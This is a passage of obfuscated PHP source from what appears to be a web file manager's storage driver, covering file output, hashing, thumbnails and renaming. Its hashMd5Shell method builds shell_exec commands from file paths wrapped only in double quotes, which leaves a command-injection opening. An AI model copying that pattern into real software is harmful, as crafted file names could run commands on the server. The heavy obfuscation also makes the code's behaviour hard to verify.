if (is_array($°ãÚÖ°[$´ô øÓâ[90]])) { $ñ„€ŒÆ[$´ô øÓâ[89]] = $°ãÚÖ°[$´ô øÓâ[90]][$´ô øÓâ[87]]; $ñ„€ŒÆ[$´ô øÓâ[79]] = $°ãÚÖ°[$´ô øÓâ[90]][$´ô øÓâ[79]]; $ñ„€ŒÆ[$´ô øÓâ[88]] = $°ãÚÖ°[$´ô øÓâ[90]][$´ô øÓâ[88]]; } else { if (substr($°ãÚÖ°[$´ô øÓâ[87]], 0, strlen($Ä¨¸Å–‚)) == $Ä¨¸Å–‚) { $ñ„€ŒÆ[$´ô øÓâ[87]] = substr($°ãÚÖ°[$´ô øÓâ[87]], strlen($Ä¨¸Å–‚)); } } $µ¾ñ¹“¶ = $°ãÚÖ°[$´ô øÓâ[78]] ? $´ô øÓâ[8] : $´ô øÓâ[12]; $ñ„€ŒÆ[$´ô øÓâ[89]] = rtrim($ñ„€ŒÆ[$´ô øÓâ[89]], $´ô øÓâ[8]) . $µ¾ñ¹“¶; $ñ„€ŒÆ[$´ô øÓâ[87]] = $´ô øÓâ[8] . trim($ñ„€ŒÆ[$´ô øÓâ[87]], $´ô øÓâ[8]) . $µ¾ñ¹“¶; if (!$™ÆšóÂ¶) { $”™ ˆ™’ = explode($´ô øÓâ[8], trim($ñ„€ŒÆ[$´ô øÓâ[87]], $´ô øÓâ[8])); $ñ„€ŒÆ[$´ô øÓâ[87]] = $´ô øÓâ[8] . implode($´ô øÓâ[8], array_slice($”™ ˆ™’, 1)) . $µ¾ñ¹“¶; } $€ñ”®ÁÅ[] = $ñ„€ŒÆ; } return array_sort_by($€ñ”®ÁÅ, $´ô øÓâ[87]); } public function upload($ñ¸¤¥Õ¡, $üÈ«‰ı, $å…åÂ“È = false, $§Ü”ı÷… = REPEAT_REPLACE) { } public function uploadFileByID($²ãœ†É, $’²Áë„Â, $òåÈ€ÏÕ) { } public function uploadFileByPath($ÚøèÜ†, $•¨¹Ê„ , $å§©Óê = array()) { } public function isUploadServer() { $Èº¦œşÜ =& $_SERVER[†ûãı«°]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Èº¦œşÜ[91]) { return !0; } return $GLOBALS[$Èº¦œşÜ[6]][$Èº¦œşÜ[92]][$Èº¦œşÜ[93]]; } public function isFileOutServer() { $‡ÊŠÌŠ  =& $_SERVER[†ûãı«°]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‡ÊŠÌŠ [91]) { return !0; } return $GLOBALS[$‡ÊŠÌŠ [6]][$‡ÊŠÌŠ [92]][$‡ÊŠÌŠ [94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($‘ÊÃ¬”¼) { $Æè‹†·ë =& $_SERVER[†ûãı«°]; if (!$this->isCdnHost()) { return $‘ÊÃ¬”¼; } return str_replace(trim(get_url_root($‘ÊÃ¬”¼), $Æè‹†·ë[8]), trim($this->cdnHost, $Æè‹†·ë[8]), $‘ÊÃ¬”¼); } public function uploadLink($è·»Òİş, $±¯óŸÍÈ = 0) { $½Óœ˜ç =& $_SERVER[†ûãı«°]; if ($this->isUploadServer()) { return; } $Î÷Ø¶° = $this->getType(); if (!in_array($Î÷Ø¶°, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $°¼ıœ†­ = 1024 * 1024 * 10; $·ªÌ·ƒ = $±¯óŸÍÈ <= $°¼ıœ†­ ? $½Óœ˜ç[95] : $½Óœ˜ç[96]; $³éü‰Áö = (!$±¯óŸÍÈ ? 1 : ceil($±¯óŸÍÈ / pow(1024, 3))) * 3600 * 4; $Èî³ô¡® = $this->{$·ªÌ·ƒ}($è·»Òİş, $³éü‰Áö); if ($Èî³ô¡®) { $Èî³ô¡®[$½Óœ˜ç[97]] = $è·»Òİş; $Èî³ô¡®[$½Óœ˜ç[98]] = $Î÷Ø¶°; } return $Èî³ô¡®; } public function uploadFormData($¿öÖ­á„, $ŒÚ°º Ì = 3600) { } public function uploadMultiData($÷„òƒÎÓ, $ÂÒ¹®Â‚ = 3600) { } public function multiUploadFormData($Åı€ÜĞÏ, $Áæ·ê“Ñ = 3600) { return $this->uploadMultiData($Åı€ÜĞÏ, $Áæ·ê“Ñ); } public function download($í¨Æ‡Ğó, $öìÊœØÄ) { } public function ext($†®íû½´) { $ÊÙ³«Ä¿ =& $_SERVER[†ûãı«°]; if (strpos($†®íû½´, $ÊÙ³«Ä¿[8]) === -1) { $øÔîÚ± = $†®íû½´; } else { $øÔîÚ± = $this->pathThis($†®íû½´); } $•Ù¥¤—µ = $ÊÙ³«Ä¿[12]; if (strstr($øÔîÚ±, $ÊÙ³«Ä¿[10])) { $•Ù¥¤—µ = substr($øÔîÚ±, strrpos($øÔîÚ±, $ÊÙ³«Ä¿[10]) + 1); $•Ù¥¤—µ = strtolower($•Ù¥¤—µ); } if (strlen($•Ù¥¤—µ) > 3 && preg_match($ÊÙ³«Ä¿[99], $•Ù¥¤—µ, $ñ¼’ª€ı)) { $•Ù¥¤—µ = $ÊÙ³«Ä¿[12]; } return $•Ù¥¤—µ; } public function pathThis($Ê®ëÑáŞ) { $öØó¼åœ =& $_SERVER[†ûãı«°]; $Ê®ëÑáŞ = str_replace($öØó¼åœ[100], $öØó¼åœ[8], rtrim($Ê®ëÑáŞ, $öØó¼åœ[8])); $ë”Œã¯ = strrpos($Ê®ëÑáŞ, $öØó¼åœ[8]); if ($ë”Œã¯ === !1) { return $Ê®ëÑáŞ; } return substr($Ê®ëÑáŞ, $ë”Œã¯ + 1); } public function pathFather($ÕÌ·æÒ) { $ÀóáİÍÃ =& $_SERVER[†ûãı«°]; $ÕÌ·æÒ = str_replace($ÀóáİÍÃ[100], $ÀóáİÍÃ[8], rtrim($ÕÌ·æÒ, $ÀóáİÍÃ[8])); $…¶æ‹¼å = strrpos($ÕÌ·æÒ, $ÀóáİÍÃ[8]); if ($…¶æ‹¼å === !1) { return $ÀóáİÍÃ[12]; } return substr($ÕÌ·æÒ, 0, $…¶æ‹¼å + 1); } public function hashSimple($‚¼œü¿Ç) { $»¡¿Á¦Ó =& $_SERVER[†ûãı«°]; if (!$‚¼œü¿Ç) { return md5($»¡¿Á¦Ó[12]); } $·òéï‚ô = $this->size($‚¼œü¿Ç); $éƒ•Ù“Ò = 200; $¢ÊÒä†ª = 50; if ($·òéï‚ô <= $éƒ•Ù“Ò * $¢ÊÒä†ª) { return $this->hashMd5($‚¼œü¿Ç) . $·òéï‚ô; } $ºØ×Ú€É = intval($·òéï‚ô / $¢ÊÒä†ª); $ÒçµÅæ = $»¡¿Á¦Ó[12]; for ($ŠÑ¬«‘é = 0; $ŠÑ¬«‘é < $¢ÊÒä†ª; $ŠÑ¬«‘é++) { $ÒçµÅæ .= $this->fileSubstr($‚¼œü¿Ç, $ºØ×Ú€É * $ŠÑ¬«‘é, $éƒ•Ù“Ò); } $ÒçµÅæ .= $this->fileSubstr($‚¼œü¿Ç, $·òéï‚ô - $éƒ•Ù“Ò, $éƒ•Ù“Ò); return md5($ÒçµÅæ) . $·òéï‚ô; } public static $md5Cache = array(); public function hashMd5($ÜĞöáÃ—) { if (!$ÜĞöáÃ—) { return md5($_SERVER[†ûãı«°][12]); } $ÜĞöáÃ— = $this->iconvSystem($ÜĞöáÃ—); if (isset(self::$md5Cache[$ÜĞöáÃ—])) { return self::$md5Cache[$ÜĞöáÃ—]; } self::$md5Cache[$ÜĞöáÃ—] = $this->hashMd5Shell($ÜĞöáÃ—); if (!self::$md5Cache[$ÜĞöáÃ—]) { self::$md5Cache[$ÜĞöáÃ—] = @md5_file($ÜĞöáÃ—); } return self::$md5Cache[$ÜĞöáÃ—]; } private function hashMd5Shell($½˜œÂ‘½) { $œÚîğ¢¿ =& $_SERVER[†ûãı«°]; if (!$½˜œÂ‘½) { return md5($œÚîğ¢¿[12]); } if (!function_exists($œÚîğ¢¿[101])) { return !1; } $Å¸†™ßÔ = array($œÚîğ¢¿[102], $œÚîğ¢¿[103]); $à…›ç–± = Cache::get($œÚîğ¢¿[104]); if (!$à…›ç–±) { $ïÅì„ôê = BASIC_PATH . $œÚîğ¢¿[105]; $¸§­Î‘‘ = md5_file($ïÅì„ôê); $à…›ç–± = $œÚîğ¢¿[106]; foreach ($Å¸†™ßÔ as $ûî¸›¨°) { $‹—¡“™Î = shell_exec($ûî¸›¨° . "\40\x22{$ïÅì„ôê}\x22"); if ($‹—¡“™Î && substr(trim($‹—¡“™Î), 0, 32) == $¸§­Î‘‘) { $à…›ç–± = $ûî¸›¨°; break; } } Cache::set($œÚîğ¢¿[104], $à…›ç–±, 3600); } if ($à…›ç–± == $œÚîğ¢¿[106]) { return !1; } $‹—¡“™Î = shell_exec($à…›ç–± . "\40\x22{$½˜œÂ‘½}\42"); $‹—¡“™Î = str_replace($œÚîğ¢¿[107], $œÚîğ¢¿[12], $‹—¡“™Î); return substr($‹—¡“™Î, 0, 32); } public function link($ô‚Ğ‡êŞ) { return $ô‚Ğ‡êŞ; } public function fileOut($İÍ˜¢ª—, $ö«œˆ÷Ÿ = false, $çæÕì¶Æ = false, $„âõø› = '') { $Ÿ®´Ä¦´ =& $_SERVER[†ûãı«°]; $this->cacheMethod(null, null); if (!$İÍ˜¢ª— || !$this->exist($İÍ˜¢ª—)) { show_json(LNG($Ÿ®´Ä¦´[108]), !1, $çæÕì¶Æ); } $½ÒÈÌ¹í = $this->getType() == $Ÿ®´Ä¦´[109]; $ºâ×½×ƒ = $GLOBALS[$Ÿ®´Ä¦´[6]][$Ÿ®´Ä¦´[92]][$Ÿ®´Ä¦´[110]][$Ÿ®´Ä¦´[111]]; $Ïé´ãâí = (double) $GLOBALS[$Ÿ®´Ä¦´[6]][$Ÿ®´Ä¦´[92]][$Ÿ®´Ä¦´[110]][$Ÿ®´Ä¦´[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ù ó·ûÎ = $this->infoFull($İÍ˜¢ª—); $¯Èò¤ˆï = $ù ó·ûÎ[$Ÿ®´Ä¦´[79]]; $ËÜÉ¼¯ = gmdate($Ÿ®´Ä¦´[113], $ù ó·ûÎ[$Ÿ®´Ä¦´[88]]); $›í‘î„´ = $çæÕì¶Æ ? $çæÕì¶Æ : $this->iconvApp($ù ó·ûÎ[$Ÿ®´Ä¦´[32]]); $ÑÆèÄÀ = 0; $ù§²’«ñ = $¯Èò¤ˆï - 1; $Ñùãñä½ = $this->ext($›í‘î„´); if (in_array($Ñùãñä½, array($Ÿ®´Ä¦´[114], $Ÿ®´Ä¦´[115], $Ÿ®´Ä¦´[116], $Ÿ®´Ä¦´[117]))) { $Ñùãñä½ = $Ÿ®´Ä¦´[118]; } if (in_array($Ñùãñä½, array($Ÿ®´Ä¦´[119]))) { $Ñùãñä½ = $Ÿ®´Ä¦´[120]; } if (!$„âõø›) { $„âõø› = md5($ËÜÉ¼¯ . $¯Èò¤ˆï); } $„âõø› = $Ÿ®´Ä¦´[121] . $„âõø› . $Ÿ®´Ä¦´[121]; $®–¬Ğß  = get_file_mime($Ñùãñä½); $ûâŠÛ›’ = !0; $ûâŠÛ›’ = isset($_GET[$Ÿ®´Ä¦´[122]]) ? !1 : !0; if ($ö«œˆ÷Ÿ === !1 && !mime_support($®–¬Ğß )) { $®–¬Ğß  = $Ÿ®´Ä¦´[123]; } header($Ÿ®´Ä¦´[124]); header($Ÿ®´Ä¦´[125] . $®–¬Ğß ); $‡§°–²ì = rawurlencode($›í‘î„´); $‡§°–²ì = $Ÿ®´Ä¦´[121] . $‡§°–²ì . $Ÿ®´Ä¦´[126] . $‡§°–²ì; if ($ö«œˆ÷Ÿ) { header($Ÿ®´Ä¦´[127]); header($Ÿ®´Ä¦´[128] . $‡§°–²ì); } else { if ($ûâŠÛ›’) { header($Ÿ®´Ä¦´[129] . $‡§°–²ì); } } $¤¢œÕ  = 3600 * 24 * 30; header($Ÿ®´Ä¦´[130]); header($Ÿ®´Ä¦´[131]); header($Ÿ®´Ä¦´[132] . $¤¢œÕ ); header($Ÿ®´Ä¦´[133] . gmdate($Ÿ®´Ä¦´[113], time() + $¤¢œÕ ) . $Ÿ®´Ä¦´[134]); if (isset($_SERVER[$Ÿ®´Ä¦´[135]]) && strtotime($_SERVER[$Ÿ®´Ä¦´[135]]) == $ù ó·ûÎ[$Ÿ®´Ä¦´[88]]) { header($Ÿ®´Ä¦´[136], !0, 304); die; } if (isset($_SERVER[$Ÿ®´Ä¦´[137]]) && $_SERVER[$Ÿ®´Ä¦´[137]] == $„âõø›) { header($Ÿ®´Ä¦´[138] . $„âõø›, !0, 304); die; } header($Ÿ®´Ä¦´[138] . $„âõø›); header($Ÿ®´Ä¦´[139] . $ËÜÉ¼¯ . $Ÿ®´Ä¦´[134]); header($Ÿ®´Ä¦´[140] . $›í‘î„´); header($Ÿ®´Ä¦´[141]); header($Ÿ®´Ä¦´[142] . $¯Èò¤ˆï); header($Ÿ®´Ä¦´[143]); Hook::trigger($Ÿ®´Ä¦´[144], $İÍ˜¢ª—, $¯Èò¤ˆï, $›í‘î„´, $Ñùãñä½); if (!$ö«œˆ÷Ÿ && $Ñùãñä½ == $Ÿ®´Ä¦´[145]) { if ($¯Èò¤ˆï > 1024 * 1024 * 5) { die; } $ƒÈ¥ëèØ = $this->getContent($İÍ˜¢ª—); $ƒÈ¥ëèØ = Html::clearSVG($ƒÈ¥ëèØ); header($Ÿ®´Ä¦´[146] . strlen($ƒÈ¥ëèØ)); echo $ƒÈ¥ëèØ; die; } $ã­“÷ĞÚ = strtolower($_SERVER[$Ÿ®´Ä¦´[147]]); if ($½ÒÈÌ¹í && $ã­“÷ĞÚ && $ºâ×½×ƒ) { if (strstr($ã­“÷ĞÚ, $Ÿ®´Ä¦´[148])) { header($Ÿ®´Ä¦´[149] . $İÍ˜¢ª—); } else { if (strstr($ã­“÷ĞÚ, $Ÿ®´Ä¦´[150])) { header($Ÿ®´Ä¦´[151] . $İÍ˜¢ª—); } else { if (strstr($ã­“÷ĞÚ, $Ÿ®´Ä¦´[152])) { header($Ÿ®´Ä¦´[153] . $İÍ˜¢ª—); } } } if ($Ïé´ãâí) { header($Ÿ®´Ä¦´[154] . $Ïé´ãâí); } return; } if (isset($_SERVER[$Ÿ®´Ä¦´[155]])) { if (preg_match($Ÿ®´Ä¦´[156], $_SERVER[$Ÿ®´Ä¦´[155]], $¤‚°ÁØÛ)) { $ÑÆèÄÀ = intval($¤‚°ÁØÛ[1]); $ÑÆèÄÀ = $ÑÆèÄÀ <= 0 ? 0 : ($ÑÆèÄÀ >= $ù§²’«ñ ? $ù§²’«ñ : $ÑÆèÄÀ); if (!empty($¤‚°ÁØÛ[2])) { $÷©Ì·Èí = intval($¤‚°ÁØÛ[2]); $ù§²’«ñ = $÷©Ì·Èí < $ÑÆèÄÀ ? $ÑÆèÄÀ : ($÷©Ì·Èí >= $ù§²’«ñ ? $ù§²’«ñ : $÷©Ì·Èí); } } header($Ÿ®´Ä¦´[157]); header("\103\157\x6e\x74\145\x6e\x74\55\x52\x61\x6e\147\x65\x3a\40\142\171\x74\x65\163\40{$ÑÆèÄÀ}\55{$ù§²’«ñ}\57" . $¯Èò¤ˆï); } else { header($Ÿ®´Ä¦´[158]); } header($Ÿ®´Ä¦´[159]); header($Ÿ®´Ä¦´[160]); $ı¯¢—’› = !0; if ($_SERVER[$Ÿ®´Ä¦´[161]] == $Ÿ®´Ä¦´[162] && $¯Èò¤ˆï > 1204 * 1024 * 1024 * 2) { $ı¯¢—’› = !1; } if ($ı¯¢—’›) { header($Ÿ®´Ä¦´[163] . ($ù§²’«ñ - $ÑÆèÄÀ + 1)); } if ($_SERVER[$Ÿ®´Ä¦´[164]] == $Ÿ®´Ä¦´[165]) { return; } $ŸÈÃ¤­± = array($Ÿ®´Ä¦´[166] => !1, $Ÿ®´Ä¦´[167] => $ÑÆèÄÀ, $Ÿ®´Ä¦´[168] => $ù§²’«ñ, $Ÿ®´Ä¦´[169] => $Ñùãñä½, $Ÿ®´Ä¦´[170] => $ù ó·ûÎ, $Ÿ®´Ä¦´[171] => $Ÿ®´Ä¦´[12], $Ÿ®´Ä¦´[172] => 0); $ŸÈÃ¤­± = Hook::filter($Ÿ®´Ä¦´[173], $ŸÈÃ¤­±); $Úêäïª = 1024 * 300; $®¹ÖŒÚƒ = 0; if ($Ïé´ãâí) { $®¹ÖŒÚƒ = intval(1000 * 1000 * ($Úêäïª / $Ïé´ãâí)); } while ($ÑÆèÄÀ <= $ù§²’«ñ) { $Ñ“Æ£õñ = timeFloat(); check_abort(); $é«È™´ = $ù§²’«ñ - $ÑÆèÄÀ + 1; if ($é«È™´ <= $Úêäïª) { $Úêäïª = $é«È™´; } $ƒÈ¥ëèØ = $this->fileSubstr($İÍ˜¢ª—, $ÑÆèÄÀ, $Úêäïª); if ($ŸÈÃ¤­±[$Ÿ®´Ä¦´[166]]) { $ŸÈÃ¤­±[$Ÿ®´Ä¦´[171]] = $ƒÈ¥ëèØ; $ŸÈÃ¤­±[$Ÿ®´Ä¦´[172]] = $ÑÆèÄÀ; $ŸÈÃ¤­± = Hook::filter($Ÿ®´Ä¦´[174], $ŸÈÃ¤­±); $ƒÈ¥ëèØ = $ŸÈÃ¤­±[$Ÿ®´Ä¦´[171]]; } echo $ƒÈ¥ëèØ; $ÑÆèÄÀ += $Úêäïª; if ($Úêäïª == $é«È™´) { $ÑÆèÄÀ = $ù§²’«ñ + 1; } if ($®¹ÖŒÚƒ) { $ø×ÑŞ‘å = intval(1000 * 1000 * (timeFloat() - $Ñ“Æ£õñ)); $ûİáƒ•“ = $®¹ÖŒÚƒ - $ø×ÑŞ‘å; if ($ûİáƒ•“ > 5) { usleep($ûİáƒ•“); } } } } public function fileOutServer($ÅØ×—†, $äû­Õ×ö = false, $¢»È‚Ï§ = false, $ú»äô¤ì = '') { $this->fileOut($ÅØ×—†, $äû­Õ×ö, $¢»È‚Ï§, $ú»äô¤ì); } public function fileOutLink($ƒÉçº±²) { header($_SERVER[†ûãı«°][175] . $ƒÉçº±²); die; } public function cacheMethod($ÈìÌüÁ¸, $Óûò·´Ğ, $¡ÄÂçÉ÷ = null) { $ùŞ¿ôú =& $_SERVER[†ûãı«°]; static $¨–Ò¢õ’ = array(); $‰º«ø¨… = $Óûò·´Ğ ? ltrim($this->getPathOuter($Óûò·´Ğ), $ùŞ¿ôú[8]) : $ùŞ¿ôú[12]; $ÀÓ™ö• = $ùŞ¿ôú[176] . $ÈìÌüÁ¸ . $ùŞ¿ôú[177] . rtrim($‰º«ø¨…, $ùŞ¿ôú[8]); if (is_null($ÈìÌüÁ¸)) { $¨–Ò¢õ’ = array(); return; } if (is_null($Óûò·´Ğ)) { foreach ($¨–Ò¢õ’ as $ÀÓ™ö• => $èà£ËË‡) { if (!strstr($ÀÓ™ö•, $ùŞ¿ôú[176] . $ÈìÌüÁ¸ . $ùŞ¿ôú[178])) { continue; } unset($¨–Ò¢õ’[$ÀÓ™ö•]); } return; } if (!is_null($¡ÄÂçÉ÷)) { $¨–Ò¢õ’[$ÀÓ™ö•] = $¡ÄÂçÉ÷; return; } $ãËÈùÕ = isset($¨–Ò¢õ’[$ÀÓ™ö•]) ? $¨–Ò¢õ’[$ÀÓ™ö•] : null; if (!is_null($ãËÈùÕ)) { return $ãËÈùÕ; } $ãËÈùÕ = $this->{$ÈìÌüÁ¸}($Óûò·´Ğ); $¨–Ò¢õ’[$ÀÓ™ö•] = $ãËÈùÕ; return $ãËÈùÕ; } public function cacheMethodInfoSet($óª´ë , $È£­òÇ, $™½àà†ª = false) { $™£’Í¡Å =& $_SERVER[†ûãı«°]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($™£’Í¡Å[179], $óª´ë , $È£­òÇ); $this->cacheMethod($™£’Í¡Å[180], $óª´ë , $È£­òÇ ? !1 : !0); if (is_array($™½àà†ª)) { $this->cacheMethod($™£’Í¡Å[181], $óª´ë , $™½àà†ª); } } public function fileOutImage($¡Î×ÕİÈ, $—ğá¦è½ = 250) { $‡ÑªÑÛî =& $_SERVER[†ûãı«°]; set_timeout(); if (substr($¡Î×ÕİÈ, 0, 4) == $‡ÑªÑÛî[152]) { $this->fileOutLink($¡Î×ÕİÈ); } $èîªÇßÊ = $this->info($¡Î×ÕİÈ); $ÒüÈÃÏğ = !1; $ÁØØÁ†« = isset($GLOBALS[$‡ÑªÑÛî[182]]) ? $GLOBALS[$‡ÑªÑÛî[182]] : array(); if ($ÁØØÁ†« && $ÁØØÁ†«[$‡ÑªÑÛî[183]] == $èîªÇßÊ[$‡ÑªÑÛî[87]]) { $èîªÇßÊ = $ÁØØÁ†«; $Á¾Ô÷Öğ = $èîªÇßÊ[$‡ÑªÑÛî[184]]; if ($Á¾Ô÷Öğ && isset($Á¾Ô÷Öğ[$‡ÑªÑÛî[185]])) { if ($Á¾Ô÷Öğ[$‡ÑªÑÛî[185]] <= $—ğá¦è½ && $Á¾Ô÷Öğ[$‡ÑªÑÛî[186]] <= $—ğá¦è½) { $ÒüÈÃÏğ = !0; } } } if ($èîªÇßÊ[$‡ÑªÑÛî[79]] <= 1024 * 50 || $ÒüÈÃÏğ || !function_exists($‡ÑªÑÛî[187]) || $èîªÇßÊ[$‡ÑªÑÛî[169]] == $‡ÑªÑÛî[188]) { return $this->fileOut($¡Î×ÕİÈ, !1, $èîªÇßÊ[$‡ÑªÑÛî[32]]); } $øìçëÉò = kodIO::hashPath($èîªÇßÊ); $üÚ¿ŒØ = "\143\x6f\166\145\x72\x5f{$øìçëÉò}\137{$—ğá¦è½}\56\x70\156\x67"; $’Ø¶‘ù = IO_PATH_SYSTEM_TEMP . $‡ÑªÑÛî[189]; $¬Ë³§ÀÚ = IO::infoFullSimple($’Ø¶‘ù); $òüŠÕŠÌ = $¬Ë³§ÀÚ && is_array($¬Ë³§ÀÚ) ? $¬Ë³§ÀÚ[$‡ÑªÑÛî[87]] : $‡ÑªÑÛî[12]; if (!$òüŠÕŠÌ) { $òüŠÕŠÌ = IO::mkdir($’Ø¶‘ù); } if ($èîªÇßÊ[$‡ÑªÑÛî[190]] == $‡ÑªÑÛî[191] && isset($èîªÇßÊ[$‡ÑªÑÛî[192]]) && $èîªÇßÊ[$‡ÑªÑÛî[192]] == kodIO::sourceID($òüŠÕŠÌ)) { $Ùª ‚¾ = $èîªÇßÊ[$‡ÑªÑÛî[193]]; if ($—ğá¦è½ <= 500) { $Òóá­¸¤ = preg_replace($‡ÑªÑÛî[194], $‡ÑªÑÛî[195], $èîªÇßÊ[$‡ÑªÑÛî[32]]); $Ùª ‚¾ = IO::fileNameExist($òüŠÕŠÌ, $Òóá­¸¤); } return IO::fileOut(KodIO::make($Ùª ‚¾), !1, $èîªÇßÊ[$‡ÑªÑÛî[32]]); } $ä…Ç¤é = IO::fileNameExist($òüŠÕŠÌ, $üÚ¿ŒØ); if ($ä…Ç¤é) { return IO::fileOut(KodIO::make($ä…Ç¤é), !1, $èîªÇßÊ[$‡ÑªÑÛî[32]]); } if ($—ğá¦è½ > 1000) { $this->makeImageCover($òüŠÕŠÌ, $¡Î×ÕİÈ, $üÚ¿ŒØ, $—ğá¦è½); $this->makeImageCover($òüŠÕŠÌ, $¡Î×ÕİÈ, "\x63\x6f\x76\145\x72\x5f{$øìçëÉò}\x5f\x32\65\x30\x2e\x70\x6e\147", 250); $ä…Ç¤é = IO::fileNameExist($òüŠÕŠÌ, $üÚ¿ŒØ); if ($ä…Ç¤é) { return IO::fileOut(KodIO::make($ä…Ç¤é), !1, $èîªÇßÊ[$‡ÑªÑÛî[32]]); } die; } if (!kodIO::allowCover($èîªÇßÊ)) { return $this->fileOut($¡Î×ÕİÈ, !1, $èîªÇßÊ[$‡ÑªÑÛî[32]]); } $«Åä˜ÂŸ = Cache::get($üÚ¿ŒØ); if ($«Åä˜ÂŸ == $‡ÑªÑÛî[196] || $«Åä˜ÂŸ == $‡ÑªÑÛî[197]) { echo $«Åä˜ÂŸ; die; } Cache::set($üÚ¿ŒØ, $‡ÑªÑÛî[197], 60); $Èôí´±õ = array($òüŠÕŠÌ, $èîªÇßÊ[$‡ÑªÑÛî[87]], $üÚ¿ŒØ, $—ğá¦è½); $àØş±Ò‰ = $‡ÑªÑÛî[198] . $èîªÇßÊ[$‡ÑªÑÛî[79]] . $‡ÑªÑÛî[199] . $üÚ¿ŒØ . $‡ÑªÑÛî[200] . $èîªÇßÊ[$‡ÑªÑÛî[32]] . $‡ÑªÑÛî[201] . $èîªÇßÊ[$‡ÑªÑÛî[87]]; TaskQueue::add($‡ÑªÑÛî[202], $Èôí´±õ, $àØş±Ò‰, $üÚ¿ŒØ); } public function makeImageCover($¿È‘üŠ”, $™¡û‹¯Ë, $ì‰ù«øÃ, $ ©ÉûÁ) { $ÓÀÑšÆû =& $_SERVER[†ûãı«°]; if (IO::fileNameExist($¿È‘üŠ”, $ì‰ù«øÃ)) { return $ÓÀÑšÆû[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ô­ ÜÚ = $this->getPathOuter($™¡û‹¯Ë); $öıñŞ¯Á = DATA_THUMB . $ì‰ù«øÃ; del_file($öıñŞ¯Á); $Âà•à‚¤ = IO::copy($Ô­ ÜÚ, TEMP_FILES, !1, $ì‰ù«øÃ); if (!@file_exists($Âà•à‚¤)) { return $ÓÀÑšÆû[204]; } ImageThumb::createThumb($Âà•à‚¤, $öıñŞ¯Á, $ ©ÉûÁ, $ ©ÉûÁ * 10); if (@file_exists($öıñŞ¯Á)) { Cache::remove($ì‰ù«øÃ); return IO::move($öıñŞ¯Á, $¿È‘üŠ”); } Cache::set($ì‰ù«øÃ, $ÓÀÑšÆû[196], 600); del_file($öıñŞ¯Á); return $ÓÀÑšÆû[205] . $Âà•à‚¤ . $ÓÀÑšÆû[74]; } public function fileOutImageServer($á²²Õö, $â‹Í¡ = 250) { $this->fileOutImage($á²²Õö, $â‹Í¡); } public function fileNameAuto($úıŒŞŞŸ, $”‚âª²¤, $î¡ï‡Íõ = REPEAT_RENAME, $ÊªÂí‰— = false) { $Âöü¶×« =& $_SERVER[†ûãı«°]; $«Ä¥Åâ = $úıŒŞŞŸ === $Âöü¶×«[12] ? $”‚âª²¤ : rtrim($úıŒŞŞŸ, $Âöü¶×«[8]) . $Âöü¶×«[8] . $”‚âª²¤; if ($î¡ï‡Íõ == REPEAT_REPLACE || !$this->exist($«Ä¥Åâ) || $ÊªÂí‰— && $î¡ï‡Íõ != REPEAT_RENAME_FOLDER) { return $”‚âª²¤; } if ($î¡ï‡Íõ == REPEAT_SKIP) { return !1; } $´¯¤Ö¥² = $Âöü¶×«[10] . get_path_ext($”‚âª²¤); $´¯¤Ö¥² = $´¯¤Ö¥² == $Âöü¶×«[10] || $ÊªÂí‰— ? $Âöü¶×«[12] : $´¯¤Ö¥²; $™É¿È³ú = 1; $©Âşï¥ = substr($”‚âª²¤, 0, strlen($”‚âª²¤) - strlen($´¯¤Ö¥²)); $şÆğ¸ú = $©Âşï¥ . "\50{$™É¿È³ú}\51{$´¯¤Ö¥²}"; while ($this->exist(rtrim($úıŒŞŞŸ, $Âöü¶×«[8]) . $Âöü¶×«[8] . $şÆğ¸ú)) { $şÆğ¸ú = $©Âşï¥ . "\50{$™É¿È³ú}\x29{$´¯¤Ö¥²}"; $™É¿È³ú++; } return $şÆğ¸ú; } private function fileNameAutoList($óß®–«Ì, $Ñ³ô»²ü, $á¸Õ‰Àß = false) { $×áÓ“‚´ =& $_SERVER[†ûãı«°]; $õÄôœÚÛ = $this->listPath($óß®–«Ì, !0); $õÄôœÚÛ = array_merge($õÄôœÚÛ[$×áÓ“‚´[85]], $õÄôœÚÛ[$×áÓ“‚´[86]]); $­¹ìñ®÷ = array_to_keyvalue($õÄôœÚÛ, $×áÓ“‚´[12], $×áÓ“‚´[32]); $¼ôÃìÎ = $×áÓ“‚´[10] . get_path_ext($Ñ³ô»²ü); $¼ôÃìÎ = $¼ôÃìÎ == $×áÓ“‚´[10] || $á¸Õ‰Àß ? $×áÓ“‚´[12] : $¼ôÃìÎ; $Ù§øÈ´Ô = substr($Ñ³ô»²ü, 0, strlen($Ñ³ô»²ü) - strlen($¼ôÃìÎ)); $ÓÙ»ÉÔƒ = $Ù§øÈ´Ô . "\x28\60\51{$¼ôÃìÎ}"; for ($¾çÆã¹– = 1; $¾çÆã¹– <= count($­¹ìñ®÷) + 1; $¾çÆã¹–++) { $ÓÙ»ÉÔƒ = $Ù§øÈ´Ô . "\x28{$¾çÆã¹–}\x29{$¼ôÃìÎ}"; if (!in_array_not_case($ÓÙ»ÉÔƒ, $­¹ìñ®÷)) { return $ÓÙ»ÉÔƒ; } } return $ÓÙ»ÉÔƒ; } public function listAllFiles($ğ¤Ú›Â®, $ëşîÍÓŞ) { $€‘ÖÛÊ =& $_SERVER[†ûãı«°]; if (empty($ëşîÍÓŞ)) { return array(); } $§Ñş‘œæ = array_keys($ëşîÍÓŞ); $‡«»£¿Ô = array(); $ğ¤Ú›Â® = trim($ğ¤Ú›Â®, $€‘ÖÛÊ[8]); foreach ($ëşîÍÓŞ as $öïÒ„¦ü => $×¤£Ôğ) { $ßşîòÌŠ = ltrim(substr(trim($öïÒ„¦ü, $€‘ÖÛÊ[8]), strlen($ğ¤Ú›Â®)), $€‘ÖÛÊ[8]); if (substr($öïÒ„¦ü, -1) == $€‘ÖÛÊ[8]) { $ßşîòÌŠ = rtrim($ßşîòÌŠ, $€‘ÖÛÊ[8]) . $€‘ÖÛÊ[8]; } $‡«»£¿Ô = array_merge($‡«»£¿Ô, $this->slicePath($ßşîòÌŠ)); } $‹’£öÈÌ = array(); foreach 